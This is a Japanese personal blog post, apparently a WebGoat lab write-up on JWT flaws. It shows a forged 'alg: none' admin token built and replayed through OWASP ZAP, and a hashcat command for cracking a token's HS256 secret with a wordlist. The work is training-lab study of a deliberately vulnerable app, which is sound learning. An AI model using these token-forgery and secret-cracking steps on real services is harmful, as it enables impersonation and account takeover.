@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>WebGoat-11: JWT tokens - グリのクソブログ</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="WebGoat-11: JWT tokens" />
+<meta property="og:description" content="JWT（Json Web Token）とは、JSONデータに電子署名や暗号化方式を格納したもの。これを使ってサーバとクライアントは認証しあうわけだが、やはりこれにも脆弱性が存在する。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://guricerin.github.io/shit-blog/post/2020/09/23-jwt-tokens/" />
+<meta property="article:published_time" content="2020-09-23T18:17:30+09:00" />
+<meta property="article:modified_time" content="2020-09-23T18:17:30+09:00" />
+
+		<meta itemprop="name" content="WebGoat-11: JWT tokens">
+<meta itemprop="description" content="JWT（Json Web Token）とは、JSONデータに電子署名や暗号化方式を格納したもの。これを使ってサーバとクライアントは認証しあうわけだが、やはりこれにも脆弱性が存在する。">
+<meta itemprop="datePublished" content="2020-09-23T18:17:30&#43;09:00" />
+<meta itemprop="dateModified" content="2020-09-23T18:17:30&#43;09:00" />
+<meta itemprop="wordCount" content="181">
+
+
+
+<meta itemprop="keywords" content="" />
+		<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WebGoat-11: JWT tokens"/>
+<meta name="twitter:description" content="JWT（Json Web Token）とは、JSONデータに電子署名や暗号化方式を格納したもの。これを使ってサーバとクライアントは認証しあうわけだが、やはりこれにも脆弱性が存在する。"/>
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="https://guricerin.github.io/shit-blog/css/style.css">
+	<link rel="stylesheet" href="https://guricerin.github.io/shit-blog/css/custom.css">
+
+	<link rel="shortcut icon" href="https://guricerin.github.io/shit-blog/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="https://guricerin.github.io/shit-blog/" title="グリのクソブログ" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="https://guricerin.github.io/shit-blog/img/icon.jpg">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">グリのクソブログ</div>
+					<div class="logo__tagline">主にB&#39;z</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="https://guricerin.github.io/shit-blog/archives">
+				
+				<span class="menu__text">ARCHIVE</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="https://guricerin.github.io/shit-blog/feed.xml">
+				
+				<span class="menu__text">RSS</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">WebGoat-11: JWT tokens</h1>
+			<div class="post__meta meta">
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2020-09-23T18:17:30&#43;09:00">2020-09-23</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="https://guricerin.github.io/shit-blog/categories/%E6%83%85%E5%A0%B1%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/" rel="category">情報セキュリティ</a>
+	</span>
+</div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<p>JWT（Json Web Token）とは、JSONデータに電子署名や暗号化方式を格納したもの。これを使ってサーバとクライアントは認証しあうわけだが、やはりこれにも脆弱性が存在する。</p>
+<p>暗号化方式を格納したヘッダー部、認証情報を格納したペイロード部のJSONデータと秘密鍵がそれぞれBase64urlエンコードされピリオドでつなげた文字列がJWTトークンとなるらしい。</p>
+<p><img src="./1.png" alt="a"></p>
+<h4 id="page-4">Page 4</h4>
+<p>どうにかして管理者ユーザになりすまし、投票データを全削除せよ、という問題。<br>
+Tomでログインする際のPOSTリクエストに対するレスポンス・ヘッダーで、<code>Cookie</code> パラメータは以下のようになっていた。</p>
+<p><code>Set-Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDE3MTE1MzksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.nhxEXTw3MOpucQlr2_j94sQ6FhGvqGVS1049d2ewcJTikF-</code>。<br>
+おそらくこれがJWTトークンだ。それぞれBase64デコードしてみる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ echo -n <span style="color:#e6db74">&#34;eyJhbGciOiJIUzUxMiJ9&#34;</span> | base64 -d
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;alg&#34;</span>:<span style="color:#e6db74">&#34;HS512&#34;</span><span style="color:#f92672">}</span>
+$ echo -n <span style="color:#e6db74">&#34;eyJpYXQiOjE2MDE3MTE1MzksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0&#34;</span> | base64 -d
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;iat&#34;</span>:1601711539,<span style="color:#e6db74">&#34;admin&#34;</span>:<span style="color:#e6db74">&#34;false&#34;</span>,<span style="color:#e6db74">&#34;user&#34;</span>:<span style="color:#e6db74">&#34;Tom&#34;</span><span style="color:#f92672">}</span>base64: invalid input
+</code></pre></div><p>あ、そうか。base64じゃなくてbase64urlじゃないとだめだ。<br>
+pythonでも<code>base64.urlsafe_b64decode()</code>を使ってみたが例外を吐くので、basse64urlエンコード・デコードにはG Suite Toolboxを使う。</p>
+<p><a href="https://toolbox.googleapps.com/apps/encode_decode/">https://toolbox.googleapps.com/apps/encode_decode/</a></p>
+<p><code>admin</code>パラメータを<code>true</code>に変更すればよさそうだ。<br>
+だが単純にそうしただけではハックできない。JWTにはヘッダー部とペイロード部から作成された電子署名があるからだ。だからパラメータを改ざんするとサーバ側の署名チェックの際に一発でばれる。<br>
+ここで詰まったのでヒントを見る。電子署名生成方式を<code>None</code>に変更し、電子署名部を削除すればよいようだ。</p>
+<ul>
+<li><code>{&quot;alg&quot;:&quot;none&quot;}</code>: <code>eyJhbGciOiJub25lIn0</code>（<code>None</code>ではだめ。ヒントに罠を貼るな。）</li>
+<li><code>{&quot;iat&quot;:1601711539,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;}</code>: <code>eyJpYXQiOjE2MDE3MTE1MzksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ</code></li>
+</ul>
+<p>これらからJWTにしたものが<code>eyJhbGciOiJub25lIn0.eyJpYXQiOjE2MDE3MTE1MzksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code>である。電子署名部を削除するといっても、末尾の<code>.</code>を消してはいけない。</p>
+<p><img src="./2.png" alt="a"></p>
+<p>owasp zapでPOSTリクエストをブレークさえ、ゴミ箱アイコンをクリック。上記のJWTを<code>access_token</code>にセットした上でリクエストすることで問題クリア。</p>
+<p><img src="./3.png" alt="a"></p>
+<h4 id="page-5">Page 5</h4>
+<p>JWTから秘密鍵を解析し、ユーザ名を変更した上で新たなJWTを送信せよ、という問題。<br>
+この記事書いてる途中でJWTをクソ簡単にデコードしてくれるwebサイトを見つけた。</p>
+<p><a href="https://jwt.io/">https://jwt.io/</a></p>
+<ul>
+<li>ヘッダー部</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;HS256&#34;</span>
+}
+</code></pre></div><ul>
+<li>ペイロード部</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;iss&#34;</span>: <span style="color:#e6db74">&#34;WebGoat Token Builder&#34;</span>,
+  <span style="color:#f92672">&#34;aud&#34;</span>: <span style="color:#e6db74">&#34;webgoat.org&#34;</span>,
+  <span style="color:#f92672">&#34;iat&#34;</span>: <span style="color:#ae81ff">1600926587</span>,
+  <span style="color:#f92672">&#34;exp&#34;</span>: <span style="color:#ae81ff">1600926647</span>,
+  <span style="color:#f92672">&#34;sub&#34;</span>: <span style="color:#e6db74">&#34;tom@webgoat.org&#34;</span>,
+  <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;Tom&#34;</span>,
+  <span style="color:#f92672">&#34;Email&#34;</span>: <span style="color:#e6db74">&#34;tom@webgoat.org&#34;</span>,
+  <span style="color:#f92672">&#34;Role&#34;</span>: [
+    <span style="color:#e6db74">&#34;Manager&#34;</span>,
+    <span style="color:#e6db74">&#34;Project Administrator&#34;</span>
+  ]
+}
+</code></pre></div><p>hashcatなるソフトウェアを使うとよいらしい。<br>
+以下のサイトからダウンロードし、<code>7z</code>で解凍。</p>
+<p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
+<p>解凍したフォルダに移動後、そのフォルダ内で辞書データをダウンロード。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&gt; git clone https://github.com/first20hours/google-10000-english.git
+</code></pre></div><p>webgoatで提示されているJWTを適当なテキストファイル（ここでは<code>webgoat.hash</code>）にコピペ。<br>
+hashcatを実行。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&gt; .<span style="color:#ae81ff">\h</span>ashcat.exe -m <span style="color:#ae81ff">16500</span> -a <span style="color:#ae81ff">0</span> .<span style="color:#ae81ff">\w</span>ebgoat.hash .<span style="color:#ae81ff">\g</span>oogle-10000-english<span style="color:#ae81ff">\g</span>oogle-10000-english.txt
+hashcat <span style="color:#f92672">(</span>v6.1.1<span style="color:#f92672">)</span> starting...
+
+ADL_Overdrive_Caps<span style="color:#f92672">()</span>: -8
+
+ADL_Overdrive_Caps<span style="color:#f92672">()</span>: -8
+
+ADL_Overdrive_Caps<span style="color:#f92672">()</span>: -8
+
+ADL_Overdrive_Caps<span style="color:#f92672">()</span>: -8
+
+ADL_Overdrive_Caps<span style="color:#f92672">()</span>: -8
+
+ADL_Overdrive_Caps<span style="color:#f92672">()</span>: -8
+
+OpenCL API <span style="color:#f92672">(</span>OpenCL 2.1 AMD-APP <span style="color:#f92672">(</span>2841.19<span style="color:#f92672">))</span> - Platform <span style="color:#75715e">#1 [Advanced Micro Devices, Inc.]</span>
+<span style="color:#f92672">======================================================================================</span>
+* Device <span style="color:#75715e">#1: gfx902, 10209/10273 MB (4048 MB allocatable), 8MCU</span>
+
+Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+
+INFO: All hashes found in potfile! Use --show to display them.
+
+Started: Thu Sep <span style="color:#ae81ff">24</span> 15:29:41 <span style="color:#ae81ff">2020</span>
+Stopped: Thu Sep <span style="color:#ae81ff">24</span> 15:29:42 <span style="color:#ae81ff">2020</span>
+</code></pre></div><p>なんでじゃ。</p>
+<h4 id="page-7">Page 7</h4>
+<p>わからん。</p>
+<h4 id="page-8">Page 8</h4>
+<p>わからん。</p>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="https://guricerin.github.io/shit-blog/post/2020/09/22-auth-bypasses/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">WebGoat-10: Authentication Bypasses</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="https://guricerin.github.io/shit-blog/post/2020/09/24-password-reset/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">WebGoat-12: Password reset</p>
+		</a>
+	</div>
+</nav>
+
+<section class="comments">
+	<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "https-guricerin-github-io-shit-blog" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+
+			</div>
+			
+
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2021 guricerin.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="https://guricerin.github.io/shit-blog/js/menu.js"></script>
+<script src="https://guricerin.github.io/shit-blog/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
